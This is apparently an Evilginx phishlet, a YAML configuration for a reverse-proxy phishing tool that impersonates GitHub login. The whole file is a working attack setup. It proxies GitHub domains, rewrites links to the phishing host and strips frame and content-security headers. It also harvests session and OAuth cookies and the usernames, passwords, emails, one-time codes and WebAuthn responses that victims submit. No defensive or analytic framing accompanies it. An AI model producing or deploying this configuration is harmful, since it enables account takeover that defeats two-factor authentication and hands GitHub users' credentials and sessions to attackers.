min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://github.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'github.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'raw', orig_sub: 'raw', domain: 'githubusercontent.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'avatars', orig_sub: 'avatars', domain: 'githubusercontent.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'camo', orig_sub: 'camo', domain: 'githubusercontent.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace GitHub domain URLs
  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: 'https://www\\.github\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.github.com', orig_sub: 'api', domain: 'github.com', search: 'https://api\\.github\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.github.com', orig_sub: 'raw', domain: 'githubusercontent.com', search: 'https://raw\\.githubusercontent\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.github.com', orig_sub: 'avatars', domain: 'githubusercontent.com', search: 'https://avatars\\.githubusercontent\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.github.com', orig_sub: 'camo', domain: 'githubusercontent.com', search: 'https://camo\\.githubusercontent\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.github.com', orig_sub: 'api', domain: 'github.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.github.com', orig_sub: 'api', domain: 'github.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary GitHub authentication cookies
  - domain: '.github.com'
    keys: ['user_session', '_gh_sess', 'logged_in', '_octo', '__Host-user_session_same_site']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.github.com'
    keys: ['_device_id', 'tz', 'has_recent_activity', 'color_mode']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.github.com'
    keys: ['_oauth_state', 'oauth_token', 'oauth_token_secret']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  otp_code:
    key: 'otp'
    search: '(.*)'
    type: 'post'
  
  authenticator_code:
    key: 'authenticator_token'
    search: '(.*)'
    type: 'post'
  
  # WebAuthn/U2F challenge responses
  webauthn_response:
    key: 'webauthn_response'
    search: '(.*)'
    type: 'json'

auth_urls:
  - '^/$'
  - '^/dashboard'
  - '^/settings'
  - '^/notifications'
  - '^/explore'
  - '^/stars'
  - '^/settings/profile'

login:
  domain: 'www.github.com'
  path: '/login'

